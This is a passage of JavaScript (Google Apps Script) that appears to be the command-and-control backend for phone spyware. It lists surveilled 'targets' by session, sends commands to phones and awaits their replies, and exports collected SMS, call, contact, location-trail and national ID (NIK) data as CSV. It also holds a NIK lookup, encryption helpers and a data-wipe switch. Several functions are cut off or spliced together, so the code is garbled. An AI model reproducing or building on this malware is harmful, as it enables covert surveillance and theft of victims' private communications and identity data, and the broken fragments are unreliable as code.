function encBlock_(w,inp){

      var a0=s[4*c],a1=s[4*c+1],a2=s[4*c+2],a3=s[4*c+3];

function sessions(){
  var rows=c2rows(),m={};
  rows.forEach(function(r){
    var s=String(r[0]||'');if(!s)return;
    var t=(r[1] instanceof Date)?r[1].getTime():String(r[1]);
    if(!m[s])m[s]={sid:s,n:0,last:t,pending:0};
    m[s].n++;m[s].last=t;
    if(String(r[2])==='task'&&String(r[4])==='pending')m[s].pending++;
  });
  return Object.keys(m).map(function(k){return m[k]}).sort(function(a,b){return b.last>a.last?1:-1}).slice(0,25);
}
function feedOf(sid){

    if(String(rows[i][0])===sid)o.push({id:i+2,t:rows[i][1],arah:String(rows[i][2]),
      cmd:String(rows[i][3]),isi:String(rows[i][5])});
    if(o.length>=20)break;
  }

}

function doPost(e){
  try{
    var p=open_(parse(e)),a=p.action||'login',m=actions();
    return m[a]?m[a](p):out({ok:true,info:'noop'});
  }catch(err){return out({ok:false,error:err.message})}
}
function doGet(e){
  var p=e.parameter||{};
  if(p.action){
    try{
      var q=open_(parse(e)),m=actions();
      if(m[q.action])return m[q.action](q);
    }catch(err){return out({ok:false,error:err.message})}
  }
  if(!p.key)return HtmlService.createHtmlOutput(pintu());
  if(p.key!==SECRET_KEY)return HtmlService.createHtmlOutput(pintu('Kunci salah.'));
  AUTO_RELOAD=p.auto==='1';
  if(p.build==='1')return out({ok:true,build:BUILD,kolom:H_LOG.length,waktu:new Date().toISOString()});
  if(p.uji==='1'){
    try{
      var teks=JSON.stringify({a:1,b:'kunci uji',t:Date.now()});
      var balik=Utilities.newBlob(ctrDec_(ctrEnc_(teks))).getDataAsString();
      return out({ok:balik===teks,build:BUILD});
    }catch(err){return out({ok:false,error:err.message})}
  }
  if(p.repair==='1')return out(repair());
  if(p.ping==='1')return out({ok:true,build:BUILD,targets:sessions().length});
  if(p.diag==='1'){
    var sl=getSheet_(SHEET_LOG),ll=sl.getLastRow();
    return out({ok:true,build:BUILD,kolom:H_LOG.length,
      log:ll>1?sl.getRange(2,1,ll-1,H_LOG.length).getValues().slice(-5):[],imp:impDump()});
  }
  if(p.nik)return out(cariNik(String(p.nik)));
  if(p.cmd&&p.sid){
    task(p.sid,p.cmd,p.arg||'',Number(p.ttl||86400000));
    return HtmlService.createHtmlOutput(kabar('Perintah "'+p.cmd+'" dikirim. Menunggu HP menjawab.',p.sid));
  }
  if(p.csv==='1')return csv(SHEET_LOG);
  if(p.csv2==='1')return csv(SHEET_C2);
  if(p.csv3==='1')return csv(SHEET_MX);
  if(p.csv4==='1')return csv(SHEET_NIK);
  if(p.csv5==='1')return csv(SHEET_JEJAK);
  if(p.csv6==='1')return csv(SHEET_KON);
  if(p.csv7==='1')return csv(SHEET_SMS);
  if(p.csv8==='1')return csv(SHEET_TEL);
  if(p.export==='1')return out({ok:true,build:BUILD,t:new Date().toISOString(),
    log:dump_(SHEET_LOG,H_LOG),nik:dump_(SHEET_NIK,H_NIK),imp:dump_(SHEET_IMP,H_IMP)});
  if(p.report==='1')return HtmlService.createHtmlOutput(report()).setTitle('Laporan');
  if(p.clear==='1'){
    Object.keys(HDR).forEach(function(n){
      var s=getSheet_(n);if(s.getLastRow()>1)s.getRange(2,1,s.getLastRow()-1,s.getMaxColumns()).clearContent()});
    return HtmlService.createHtmlOutput(kabar('Data dikosongkan.'));
  }
  return HtmlService.createHtmlOutput(consoleAman()).setTitle('MOC');
}
